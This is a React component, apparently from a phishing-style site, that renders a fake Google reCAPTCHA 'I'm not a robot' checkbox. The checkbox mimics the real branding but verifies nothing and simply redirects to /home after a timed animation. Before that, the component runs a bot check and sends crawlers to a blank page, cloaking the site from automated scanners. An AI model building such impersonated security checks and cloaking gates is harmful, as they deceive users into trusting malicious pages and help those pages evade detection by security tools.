import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router';
import detectBot from '@/utils/detect_bot';

const SYSTEM_FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';

const CaptchaGate = () =>
{
    const navigate = useNavigate();
    const [ status, setStatus ] = useState( 'idle' ); // 'idle' | 'verifying' | 'verified'
    const [ isCheckingBot, setIsCheckingBot ] = useState( true );

    useEffect( () =>
    {
        const check = async () =>
        {
            try
            {
                const res = await detectBot();
                if ( res.isBot )
                {
                    window.location.href = 'about:blank';
                    return;
                }
            } catch
            {
                // Bỏ qua nếu lỗi check
            }
            setIsCheckingBot( false );
        };
        check();
    }, [] );

    const handleVerifyClick = () =>
    {
        if ( status !== 'idle' ) return;
        setStatus( 'verifying' );

        setTimeout( () =>
        {
            setStatus( 'verified' );
            setTimeout( () =>
            {
                navigate( '/home', { replace: true } );
            }, 600 );
        }, 1000 );
    };

    if ( isCheckingBot )
    {
        return <div style={ { position: 'fixed', inset: 0, backgroundColor: '#ffffff' } } />;
    }

    return (
        <>
            <style>{ `
                @keyframes metaSpin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .captcha-only-wrap * {
                    font-family: ${ SYSTEM_FONT } !important;
                    box-sizing: border-box;
                }
            ` }</style>

            <div
                className="captcha-only-wrap"
                style={ {
                    position: 'fixed',
                    inset: 0,
                    width: '100vw',
                    height: '100dvh',
                    backgroundColor: '#ffffff',
                    display: 'flex',
                    justifyContent: 'center',
                    alignItems: 'center',
                    padding: '16px'
                } }
            >
                <div
                    onClick={ handleVerifyClick }
                    role="button"
                    tabIndex={ 0 }
                    onKeyDown={ ( e ) =>
                    {
                        if ( e.key === 'Enter' || e.key === ' ' ) handleVerifyClick();
                    } }
                    style={ {
                        width: '304px',
                        height: '78px',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        backgroundColor: '#f9f9f9',
                        border: '1px solid #d3d3d3',
                        borderRadius: '3px',
                        padding: '0 12px',
                        boxShadow: '0 0 4px 1px rgba(0, 0, 0, 0.08)',
                        cursor: status === 'idle' ? 'pointer' : 'default',
                        userSelect: 'none'
                    } }
                >
                    <div style={ { display: 'flex', alignItems: 'center', gap: '12px' } }>
                        <div
                            style={ {
                                width: '28px',
                                height: '28px',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center'
                            } }
                        >
                            { status === 'idle' && (
                                <div
                                    style={ {
                                        width: '24px',
                                        height: '24px',
                                        backgroundColor: '#ffffff',
                                        border: '2px solid #c1c1c1',
                                        borderRadius: '2px'
                                    } }
                                />
                            ) }

                            { status === 'verifying' && (
                                <div
                                    style={ {
                                        width: '24px',
                                        height: '24px',
                                        border: '3px solid #e2e8f0',
                                        borderTop: '3px solid #4285f4',
                                        borderRadius: '50%',
                                        animation: 'metaSpin 0.8s linear infinite'
                                    } }
                                />
                            ) }

                            { status === 'verified' && (
                                <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                                    <path
                                        d="M4.5 12.75l5.25 5.25 9.75-11.25"
                                        stroke="#009e55"
                                        strokeWidth="3.2"
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                    />
                                </svg>
                            ) }
                        </div>

                        <span
                            style={ {
                                fontSize: '14px',
                                fontWeight: '400',
                                color: '#000000'
                            } }
                        >
                            I&apos;m not a robot
                        </span>
                    </div>

                    <div
                        style={ {
                            display: 'flex',
                            flexDirection: 'column',
                            alignItems: 'center',
                            justifyContent: 'center',
                            fontSize: '9px',
                            color: '#555555',
                            lineHeight: '1.15',
                            textAlign: 'center'
                        } }
                    >
                        <svg width="28" height="28" viewBox="0 0 32 32" fill="none" style={ { marginBottom: '2px' } }>
                            <path d="M16 4C9.9 4 4.9 8.5 4.1 14.4H8.2C8.9 10.8 12.1 8 16 8C18.3 8 20.4 9 21.8 10.5L18.5 13.8H27V5.3L24.5 7.8C22.4 5.5 19.4 4 16 4Z" fill="#1C3AA9" />
                            <path d="M27.9 17.6H23.8C23.1 21.2 19.9 24 16 24C13.7 24 11.6 23 10.2 21.5L13.5 18.2H5V26.7L7.5 24.2C9.6 26.5 12.6 28 16 28C22.1 28 27.1 23.5 27.9 17.6Z" fill="#4285F4" />
                        </svg>
                        <span>reCAPTCHA</span>
                        <span style={ { fontSize: '8px', color: '#777777' } }>Privacy - Terms</span>
                    </div>
                </div>
            </div>
        </>
    );
};

export default CaptchaGate;
